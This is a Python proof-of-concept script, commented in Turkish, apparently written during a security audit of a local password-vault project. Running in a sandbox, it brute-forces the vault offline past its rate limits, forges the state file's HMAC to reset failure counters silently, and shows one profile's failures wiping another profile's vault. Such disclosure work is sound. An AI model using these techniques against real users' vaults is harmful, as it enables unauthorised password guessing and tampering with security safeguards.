#!/usr/bin/env python3
"""PoC 01: Kaba kuvvet savunmalarinin bypass'i (3 farkli zafiyet).

A) OFFLINE BYPASS: .mvat dosyasini ele geciren saldirgan MilitaryVault.decrypt'i
   dogrudan cagirir; unlock_vault() katmanindaki tum sayaclar/rate-limit/wipe devre disi kalir.
B) STATE TAMPERING: .security_state.json dosyasi HMAC'siz veya gecersiz HMAC ile
   degistirilse bile kabul edilir (yalnizca loglanir). HMAC anahtari kamuya acik
   get_hardware_fingerprint()'ten turetildigi icin SESSIZ kurcalama mumkun.
C) CAPRAZ PROFIL KONTAMINASYONU: _failed_attempts modul global'i tum profillerce
   paylasilir; baska bir profildeki hatalar bu profilin wipe esigini tetikler ->
   YANLIS kasayi imha (keşif: PoC yazilirken canli gozlemlendi).
"""
import os
import sys
import json
import time
import shutil
import hmac
import hashlib

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc01"
shutil.rmtree(SANDBOX, ignore_errors=True)
os.makedirs(SANDBOX)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)

import vault_storage as vs
from military_audit import CryptographicAuditTrail
from military_vault import MilitaryVault, VaultSecurityError

MASTER = "DogruParola!2026"
PROFILE = "victim"
STATE_FILE = vs.SECURITY_STATE_FILE


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


def forge_state(state):
    hw_key = f"AEGIS-STATE-HMAC:{vs.get_hardware_fingerprint()}".encode("utf-8")
    tag = hmac.new(hw_key, json.dumps(state, sort_keys=True).encode("utf-8"), hashlib.sha256).hexdigest()
    with open(STATE_FILE, "w", encoding="utf-8") as f:
        json.dump({"state": state, "hmac": tag}, f, indent=2)


def tamper_events():
    return sum(1 for e in CryptographicAuditTrail._read_chain() if e["event_type"] == "SECURITY_STATE_TAMPER")


def wipe_events():
    return [e for e in CryptographicAuditTrail._read_chain() if e["event_type"] == "SCORCHED_EARTH_BRUTEFORCE_WIPE"]


vs.init_vault(master_password=MASTER, profile_name=PROFILE)
vs.configure_profile_security_policy(PROFILE, dms_days=1, max_failed_wipe=3)
vault_file = vs.get_profile_files(PROFILE)[0]
print(f"[+] Kurban profili olusturuldu: max_failed_wipe=3, DMS=1 gun")

# ---------------------------------------------------------------------------
banner("A) OFFLINE SALDIRI: uygulama katmani tamamen atlanir")
# ---------------------------------------------------------------------------
armored = open(vault_file, encoding="utf-8").read()
for i in range(10):
    try:
        MilitaryVault.decrypt(armored, f"hashcat-tahmini-{i}")
    except VaultSecurityError:
        pass
print(f"[A] MilitaryVault.decrypt ile 10 parola tahmini yapildi (hashcat senaryosu).")
print(f"[A] Rate-limit var mi? HAYIR (GUI katmaninda, saldirgan uygulamayi hic calistirmiyor)")
print(f"[A] Scorched-earth wipe oldu mu? {len(wipe_events()) > 0}")
print(f"[A] Kasa dosyasi duruyor mu? {os.path.exists(vault_file)}")
print(f"[A] Audit'e AUTH_FAILURE yazildi mi? {'AUTH_FAILURE' in [e['event_type'] for e in CryptographicAuditTrail._read_chain()]}")

# ---------------------------------------------------------------------------
banner("B) STATE TAMPERING: sayac sifirlama -> sinirsiz cevrimdisi-olmayan deneme")
# ---------------------------------------------------------------------------
print("[B1] Naif kurcalama (HMAC guncellenmedi):")
with open(STATE_FILE, encoding="utf-8") as f:
    wrapper = json.load(f)
wrapper["state"]["profiles"][PROFILE]["failed_attempts"] = 99
wrapper["state"]["profiles"][PROFILE]["last_failed_time"] = time.time()
with open(STATE_FILE, "w", encoding="utf-8") as f:
    json.dump(wrapper, f, indent=2)
st = vs._load_security_state()["profiles"][PROFILE]
print(f"     -> _load_security_state() kurcalanmis degeri dondurdu: failed_attempts={st['failed_attempts']}")
print(f"     -> SECURITY_STATE_TAMPER uretildi mi? {tamper_events() > 0} (loglanir ama state yine kullanilir!)")

print("\n[B2] Gecerli HMAC ile SESSIZ kurcalama + 9 deneme boyunca sayac sifirlama:")
state = vs._load_security_state()
forge_state(state)
before_tamper = tamper_events()
true_attempts = 0
rate_limited = 0
for i in range(9):
    vs._failed_attempts = 0
    vs._last_failed_time = 0.0
    state = vs._load_security_state()
    state["profiles"][PROFILE].update({
        "failed_attempts": 0, "last_failed_time": 0.0, "max_failed_wipe": 3, "dms_days": 1,
        "last_checkin_epoch": time.time(),
    })
    forge_state(state)
    try:
        vs.unlock_vault(f"kurban-tahmin-{i}", profile_name=PROFILE)
    except VaultSecurityError as e:
        true_attempts += 1
        if "Anti-Brute Force" in str(e):
            rate_limited += 1
    state = vs._load_security_state()
    state["profiles"][PROFILE].update({"failed_attempts": 0, "last_failed_time": 0.0})
    forge_state(state)

silent = tamper_events() == before_tamper
print(f"     -> Gercek hatali deneme: {true_attempts} (wipe esigi=3). Rate-limit'e takilan: {rate_limited}")
print(f"     -> Yeni SECURITY_STATE_TAMPER olayi: {not silent} (False = tamamen SESSIZ)")
print(f"     -> Wiper tetiklendi mi? {len(wipe_events()) > 0}")
print(f"     -> Kasa hala duruyor mu? {os.path.exists(vault_file)}")

print("\n[B3] Dead-Man's Switch atesi (gecerli HMAC):")
state = vs._load_security_state()
state["profiles"][PROFILE]["dms_days"] = 1
state["profiles"][PROFILE]["last_checkin_epoch"] = 0
forge_state(state)
triggered, msg = vs.check_dead_mans_switch(PROFILE)
print(f"     -> dms_days=1, geçmis check-in -> tetiklendi mi? {triggered}  (last_checkin>0 sarti 0'i yutar)")

# ---------------------------------------------------------------------------
banner("C) CAPRAZ PROFIL KONTAMINASYONU: yanlis kasa imha edilir")
# ---------------------------------------------------------------------------
vs.unlock_vault(MASTER, profile_name=PROFILE)
print(f"[C] (global sayac basariyla sifirlandi: _failed_attempts={vs._failed_attempts})")
vs.init_vault(master_password=MASTER, profile_name="profil_A")
vs.init_vault(master_password=MASTER, profile_name="profil_B")
vs.configure_profile_security_policy("profil_A", dms_days=0, max_failed_wipe=3)
vs.configure_profile_security_policy("profil_B", dms_days=0, max_failed_wipe=3)

for i in range(2):
    try:
        vs.unlock_vault("A-yanlis-%d" % i, profile_name="profil_A")
    except VaultSecurityError:
        pass
print(f"[C] profil_A'da 2 hatali deneme yapildi (global sayac={vs._failed_attempts})")

try:
    vs.unlock_vault("B-tek-yanlis", profile_name="profil_B")
except VaultSecurityError as e:
    print(f"[C] profil_B'de SADECE 1 hatali deneme yapildi -> {str(e)[:90]}")

b_file = vs.get_profile_files("profil_B")[0]
b_wipes = [e for e in wipe_events() if e["actor"] == "profil_B"]
print(f"[C] profil_B kasasi imha edildi mi? {not os.path.exists(b_file)}")
if b_wipes:
    print(f"[C] Audit kaniti: '{b_wipes[0]['details']}'")
    print(f"[C] (Gerçek B denemesi: 1 | sayilan: {b_wipes[0]['details'].split('(')[1].split(')')[0]})")

print("\n" + "-" * 72)
print("KANIT:")
print("  A) README tehdit modelindeki 'offline brute-force' saldirganina karsi tum")
print("     koruma katmani (rate-limit/wipe/DMS) etkisiz; dosya diske dustügü an savunma yok.")
print("  B) HMAC'siz kurcalama kabul ediliyor; anahtar kamuya acik oldugundan SESSIZ kurcalama")
print("     ile 9 tahmine ragmen wipe/rate-limit yok. DMS manipule edilebiliyor.")
print("  C) Global sayac profiller arasi siziyor: B profilinde 1 hatali deneme ile B imha edildi.")
print("-" * 72)
